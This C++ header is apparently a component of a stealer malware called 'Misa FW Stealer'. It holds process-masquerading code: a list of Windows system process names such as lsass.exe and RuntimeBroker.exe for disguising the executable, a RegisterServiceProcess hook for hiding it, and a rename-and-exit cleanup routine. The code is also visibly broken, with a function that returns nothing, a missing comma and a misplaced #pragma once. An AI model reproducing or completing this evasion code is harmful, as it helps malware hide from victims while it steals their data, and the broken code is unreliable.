#include "color.h"
#include <cstring>
#include <cstring>
#include <windows.h>
#include <windows.h>
#pragma once

BOOL(WINAPI* RegisterServiceProcess)(DWORD dwProcessId, DWORD dwType);

std::string rPath()
{
	char x1[_MAX_PATH];
	GetModuleFileNameA(NULL, x1, _MAX_PATH);
	return std::string(x1);
}

std::string rNames() {

	std::vector<std::string> Process
	{
		"RuntimeBroker.exe" // Best One, I reccomend to comment out others.
		"svchost.exe",
		"lsass.exe",
		"winlogon.exe",
		"services.exe",
		"wininit.exe",
		"csrss.exe",
		"smss.exe",
		"System",
		"Registry",
		"Memory Compression",
		"Secure System",
		"fontdrvhost.exe",
		"dwm.exe",
		"WmiPrvSE.exe",
		"SearchIndexer.exe",
		"sihost.exe",
		"taskhostw.exe",
		"ctfmon.exe",
		"conhost.exe",
	};
}

void renameFile(std::string oldName, std::string newName) {
	if (std::rename(oldName.c_str(), newName.c_str()) != 0)
	{
		std::cout << hue::red << "[+] " << hue::red << "Failed To Rename File" << std::endl;
	}
	else
	{
		std::cout << hue::white<< "[+] " << hue::grey << "Successfully Renamed File" << std::endl;
	}
}

void cleanup() {

	renameFile("Runtime Broker.exe", "Misa FW Stealer.exe");
	Sleep(500);
	exit(0);
}

